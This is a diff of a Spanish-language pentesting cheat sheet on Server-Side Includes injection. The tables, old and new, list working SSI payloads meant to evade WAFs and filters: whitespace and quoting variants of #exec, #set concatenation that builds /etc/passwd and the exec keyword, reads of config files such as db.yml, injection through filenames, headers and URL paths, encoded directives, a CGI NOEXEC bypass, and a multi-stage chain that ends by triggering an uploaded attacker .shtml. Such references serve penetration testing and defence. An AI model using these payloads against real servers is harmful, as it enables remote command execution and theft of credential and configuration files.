@@ -21,57 +21,48 @@ linked:
 ## Whitespace Tricks
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
-|:---:|:---:|:---:|
-| Block `<!--#exec` literal | `<!--#  exec cmd="id"-->` | Multi-space después `#`. |
-| Block `#exec` | `<!-- #exec cmd="id" -->` | Space después `<!--`. |
-| Block sin space | `<!--#exec cmd = "id" -->` | Spaces alrededor del `=`. |
-| Block tab vs space | `<!--#exec\tcmd=\"id\"-->` | Tab en lugar de space. |
-| Multi-whitespace | `<!--  #  exec  cmd  =  \"id\"  -->` | Multiple spaces. |
-| Newlines in directive | `<!--#exec\ncmd="id"\n-->` | Some parsers tolerate. |
-| Trailing space | `<!--#exec cmd="id" -->` (extra space) | Standard. |
-| `cmd` attribute order | `<!--#exec cmd="id"-->` vs ` -->` (no space) | Edge tolerance. |
-| Apache `mod_include` is permissive | Most parsers tolerate variants | Standard. |
-| IIS variants | Different whitespace tolerance | Per-server. |
+|---|---|---|
+| `<!--#  exec cmd="id"-->` | Bypassea filtro de `<!--#exec` literal | Multi-espacio tras `#` |
+| `<!-- #exec cmd="id" -->` | Bypassea filtro de `#exec` | Espacio tras `<!--` |
+| `<!--#exec cmd = "id" -->` | Bypass por espacios en el `=` | Filtro estricto de sintaxis |
+| `<!--#exec\tcmd="id"-->` | Tab en vez de espacio | Filtro que solo matchea espacios |
+| `<!--  #  exec  cmd  =  "id"  -->` | Múltiples espacios | Filtro de patrón rígido |
+| `<!--#exec\ncmd="id"\n-->` | Newlines dentro del directive | Parsers tolerantes |
+
 ^ssi-bypass-whitespace
+
+> [!note] `mod_include` de Apache es permisivo con variantes de whitespace; IIS tolera distinto. Probá varias.
 
 ---
 
 ## `#set` Concatenation
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
-|:---:|:---:|:---:|
-| Concept | Block `/etc/passwd` literal → split via `#set` vars | Filter bypass via concat. |
-| Split path | `<!--#set var="p1" value="/etc/" --><!--#set var="p2" value="passwd" --><!--#include file="$p1$p2" -->` | Standard. |
-| Split keyword | `<!--#set var="a" value="ex" --><!--#set var="b" value="ec" --><!--#exec cmd="$a$b $cmd" -->` | If parser does var subs first. |
-| Split filter target | `<!--#set var="x" value="cat /etc/" --><!--#exec cmd="$x" -->` | Concat with command. |
-| Combine con env vars | Use existing env vars en path concat | `$DOCUMENT_ROOT/../etc/passwd` |
-| Multi-step set chain | Build complex strings through multiple sets | Chain. |
-| Var interpolation in include | `<!--#include file="$DOCUMENT_ROOT/../config/db.yml" -->` | Standard. |
-| Var interpolation in exec | `<!--#exec cmd="cat $DOCUMENT_ROOT/../etc/passwd" -->` | Combine. |
-| WAF inspection only on raw | Concat'd value escapes WAF regex | Standard. |
-| Combine con `#if` | Conditional logic con vars | Edge. |
+|---|---|---|
+| `<!--#set var="p1" value="/etc/" --><!--#set var="p2" value="passwd" --><!--#include file="$p1$p2" -->` | Arma `/etc/passwd` partido en vars | WAF que matchea el path literal |
+| `<!--#set var="a" value="ex" --><!--#set var="b" value="ec" --><!--#exec cmd="$a$b cmd" -->` | Arma la keyword `exec` partida | WAF que filtra `exec` |
+| `<!--#set var="x" value="cat /etc/" --><!--#exec cmd="$x passwd" -->` | Comando concatenado | Filtro sobre el comando |
+| `<!--#include file="$DOCUMENT_ROOT/../config/db.yml" -->` | Path armado con env var | Esconder el path del WAF |
+| `<!--#exec cmd="cat $DOCUMENT_ROOT/../etc/passwd" -->` | Comando con env var interpolada | Combinar con concat |
+
 ^ssi-bypass-set-concat
+
+> [!tip] El WAF inspecciona el valor **crudo**; el valor concatenado (`$p1$p2`) se arma recién en el parser SSI → escapa la regex.
 
 ---
 
 ## Inyección via Filename / Headers
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
-|:---:|:---:|:---:|
-| Filename injection | Upload con filename `<!--#exec cmd="id" -->.txt` | If filename listed en .shtml. |
-| Filename with extension trick | `shell.shtml` con SSI content | Direct render. |
-| Profile fields | Bio / signature reflected | Stored vector. |
-| Comment fields | Persistent SSI inject | Stored. |
-| Header User-Agent | If logged en .shtml dashboard | Header reflection. |
-| Header Referer | Same | Same. |
-| Header Cookie | If reflected | Edge. |
-| Header X-Custom | If logged / reflected | Edge. |
-| URL path | `/page.shtml/<!--#exec cmd="id"-->` | Path-based. |
-| Form fields | Search, contact forms | Most common vector. |
-| Email subject if rendered en .shtml | Edge case | Per-app. |
-| Dashboard logs | If logs displayed via SSI | High-impact. |
-| Combine con file upload | Upload SSI .shtml directly | Standard. |
-| Combine con stored XSS | XSS + SSI compound | Multi-vector. |
+| **Vector** | **Cómo** | **Cuándo** |
+|---|---|---|
+| Form fields | Inyectar en search/contact/comments | Vector más común |
+| Filename | Nombre de archivo = `<!--#exec cmd="id" -->.txt` | Si el filename se lista en un `.shtml` |
+| Profile / bio / firma | Campo reflejado en página `.shtml` | Vector persistente (stored) |
+| Header `User-Agent` / `Referer` | Si se loguea en un dashboard `.shtml` | Reflexión de header |
+| Header `Cookie` / `X-Custom` | Si se refleja en `.shtml` | Edge |
+| URL path | `/page.shtml/<!--#exec cmd="id"-->` | Inyección por path |
+| Upload `.shtml` | Subir archivo con SSI directamente | Stored exec |
+
 ^ssi-bypass-filename-headers
 
 ---
@@ -79,21 +70,13 @@ linked:
 ## Encoding y CGI Fallback
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
-|:---:|:---:|:---:|
-| HTML entity encoding | `&lt;!--#exec cmd="id"--&gt;` | If app decodes pre-parse. |
-| URL encoding | `%3C!--%23exec%20cmd=%22id%22--%3E` | Standard. |
-| Mixed encoding | Combinations | Multi-layer. |
-| CGI fallback (NOEXEC bypass) | `<!--#include virtual="/cgi-bin/test.cgi?$(id)" -->` | If CGI accepts shell command via param. |
-| CGI con vulnerable script | Trigger CGI script with payload | Standard. |
-| `#config errmsg` for custom output | Customize error to reveal info | Edge. |
-| Single quote vs double | `<!--#exec cmd='id'-->` vs `"id"` | Quote bypass. |
-| No quotes | `<!--#exec cmd=id -->` (some parsers) | Edge tolerance. |
-| Unicode whitespace | Different whitespace chars | Edge. |
-| SVG con SSI inside | Upload SVG con SSI directives | Edge. |
-| `+IncludesNOEXEC` workflow | Use `#include` for LFI; chain con writable upload + SSI for RCE | Standard. |
-| Multi-stage chain | Stage 1: include reveals upload dir → Stage 2: upload SSI → Stage 3: include uploaded | Compound. |
-| Combine con LFI | LFI to source disclosure → identify SSI vector | Adjacent. |
-| Combine con SSRF | SSRF includes SSI directives via include virtual | Edge. |
+|---|---|---|
+| `&lt;!--#exec cmd="id"--&gt;` | Directive con entidades HTML | Si la app decodifica antes de parsear |
+| `%3C!--%23exec%20cmd=%22id%22--%3E` | Directive URL-encoded | Bypass de filtros simples |
+| `<!--#exec cmd='id'-->` | Comillas simples en vez de dobles | Si `"` está filtrado |
+| `<!--#exec cmd=id -->` | Sin comillas | Parsers tolerantes |
+| `<!--#include virtual="/cgi-bin/test.cgi?$(id)" -->` | RCE vía CGI (bypass de `NOEXEC`) | Si un CGI acepta comando por param |
+
 ^ssi-bypass-encoding-cgi
 
 ### Multi-stage filter bypass
@@ -107,8 +90,7 @@ linked:
 <!-- Stage 2: Read app source for upload paths -->
 <!--#include file="/var/www/html/upload.php" -->
 
-<!-- Stage 3: Upload .shtml con SSI exec -->
-<!-- Via separate upload endpoint -->
+<!-- Stage 3: Upload .shtml con SSI exec (via separate upload endpoint) -->
 
 <!-- Stage 4: Trigger uploaded shell -->
 <!--#include virtual="/uploads/atacante.shtml" -->
